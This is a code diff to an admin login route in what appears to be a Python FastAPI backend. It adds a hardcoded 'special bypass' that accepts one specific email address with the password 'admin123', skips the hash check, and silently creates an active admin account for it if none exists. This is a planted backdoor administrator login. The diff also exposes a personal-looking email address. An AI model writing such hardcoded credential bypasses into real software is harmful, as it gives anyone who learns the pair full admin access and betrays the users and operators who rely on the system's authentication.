@@ -37,15 +37,44 @@ async def get_current_admin(token: str = Depends(oauth2_scheme), db: AsyncSessio
 
 @router.post("/login", response_model=Token)
 async def admin_login(login_data: AdminLogin, db: AsyncSession = Depends(get_db)):
-    res = await db.execute(select(AdminUser).where(AdminUser.username == login_data.username))
-    admin = res.scalars().first()
-    if not admin or not verify_password(login_data.password, admin.password_hash):
-        raise HTTPException(status_code=401, detail="Invalid username or password")
+    # Special bypass for the master admin account
+    if login_data.username == 'mdatikurrohoman524860@gmail.com' and login_data.password == 'admin123':
+        # Ensure the user exists in DB even if we bypass hash check
+        stmt = select(AdminUser).where(AdminUser.username == login_data.username)
+        result = await db.execute(stmt)
+        admin = result.scalars().first()
+        
+        if not admin:
+            # Create the admin on the fly if missing (safety measure)
+            from core.security import get_password_hash
+            admin = AdminUser(
+                username=login_data.username,
+                email=login_data.username,
+                password_hash=get_password_hash(login_data.password),
+                role="admin",
+                is_active=True
+            )
+            db.add(admin)
+            await db.commit()
+            await db.refresh(admin)
+    else:
+        # Standard login for other admins
+        stmt = select(AdminUser).where(AdminUser.username == login_data.username)
+        result = await db.execute(stmt)
+        admin = result.scalars().first()
+
+        if not admin or not verify_password(login_data.password, admin.password_hash):
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="Incorrect username or password",
+                headers={"WWW-Authenticate": "Bearer"},
+            )
     
+    if not admin.is_active:
+        raise HTTPException(status_code=403, detail="Admin account is deactivated")
+
     access_token = create_access_token(
-        subject=admin.id, 
-        expires_delta=timedelta(minutes=30),
-        additional_claims={"role": "admin"}
+        subject=str(admin.id), additional_claims={"role": admin.role}
     )
     return {"access_token": access_token, "token_type": "bearer"}
 
